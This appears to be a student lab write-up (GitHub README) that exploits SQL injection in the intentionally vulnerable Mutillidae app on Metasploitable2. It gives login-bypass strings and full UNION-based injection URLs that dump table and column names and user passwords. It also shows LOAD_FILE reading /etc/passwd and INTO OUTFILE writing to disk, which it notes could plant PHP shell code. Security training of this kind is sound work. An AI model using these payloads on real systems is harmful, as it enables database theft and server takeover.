# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/Naadira/sqlinjection/assets/128135126/7eff6e94-7319-4612-afa5-3ef91bf66d87)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 325657622-28300288-17b2-4d70-b1d6-3ee0a018feac
![image](https://github.com/Naadira/sqlinjection/assets/128135126/60aa7888-8ef3-4ffb-bbb3-01d0fe7e7f95)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/Naadira/sqlinjection/assets/128135126/c1f86b57-2a8a-4458-82b5-770a1bab73d5)

Click on the menu Login/Register and register for an account
![image](https://github.com/Naadira/sqlinjection/assets/128135126/c707cb96-f783-43f8-ab36-28b68196a203)

Click on the link “Please register here”
![image](https://github.com/Naadira/sqlinjection/assets/128135126/9b2a4854-9c54-4354-a1c1-feb6b4333d4e)

Click on “Create Account” to display the following page
![image](https://github.com/Naadira/sqlinjection/assets/128135126/8eb662ee-7086-4c90-99d4-d33c6e31760a)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/Naadira/sqlinjection/assets/128135126/1ac25ec9-cccd-4a9c-a81a-ac54e8e2101a)

Click “Login”. The logged in page will show as below:
![image](https://github.com/Naadira/sqlinjection/assets/128135126/1c6f035e-37b0-42a7-9d92-b81993a4e576)

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/Naadira/sqlinjection/assets/128135126/8ee2c044-36cc-4da1-8149-115824a5c5f2)

Click the login button and you will see it enter into the administrator page. 325658372-b7b5d131-fcc9-4084-8173-4cb7fe583f0b
![image](https://github.com/Naadira/sqlinjection/assets/128135126/93f28916-a9c1-4bac-8bc2-c540681a4941)

## Union-based SQL injection:

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” After logging out, Now choose the menu as shown below
![image](https://github.com/Naadira/sqlinjection/assets/128135126/cdc01b06-e01e-4e7a-b81c-ea4b73329496)
![image](https://github.com/Naadira/sqlinjection/assets/128135126/ddb99f11-7530-41ab-97f0-0aa39d4f3681)
![image](https://github.com/Naadira/sqlinjection/assets/128135126/4f83a835-b97d-4ae9-a0e7-88a20b6d647a)
![image](https://github.com/Naadira/sqlinjection/assets/128135126/db925363-d281-4a85-82ba-017396a5af3d)
![image](https://github.com/Naadira/sqlinjection/assets/128135126/91deb4ca-6bfd-4a2e-8619-54ba0b74bd80)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/Naadira/sqlinjection/assets/128135126/ef8608b3-f9db-4a7b-ae2b-8f93f13fa3eb)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6. The browser url of this info page need to be modified with the url as below: http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Naadira/sqlinjection/assets/128135126/b4640265-039e-46d9-9a7d-50a81b957587)

After adding the order by 6 into the existing url , the following error statement will be obtained: 325659955-4c68e9ec-cb59-44dc-8a1f-3e56b3af0041
![image](https://github.com/Naadira/sqlinjection/assets/128135126/726125ba-31c9-4eef-8aa0-1bae566ceb47)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/Naadira/sqlinjection/assets/128135126/c69e5cbe-b89a-43ce-a0c9-649b867182a8)

As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/Naadira/sqlinjection/assets/128135126/c55264e6-c2e7-4f2e-af8f-af7ad7b2cb69)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/Naadira/sqlinjection/assets/128135126/a3bd9dcd-067f-4546-82cc-ab9340037bc2)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/Naadira/sqlinjection/assets/128135126/0b061d1a-c0e7-4ab0-bf4d-b5730bb45680)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Naadira/sqlinjection/assets/128135126/a17a7429-bf25-4164-8963-1f216fc19acf)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![image](https://github.com/Naadira/sqlinjection/assets/128135126/5cbbe3de-dd29-4f16-a637-82e4d873da7a)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Naadira/sqlinjection/assets/128135126/bea80f2f-f7c5-4ad2-829c-c915deb111c0)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Naadira/sqlinjection/assets/128135126/4f29083a-25fa-4c3f-ba25-053309ef4287)

## Reading and writing files on the web-server:
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Naadira/sqlinjection/assets/128135126/43635110-463b-4b2b-9a84-ab156c836b72)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
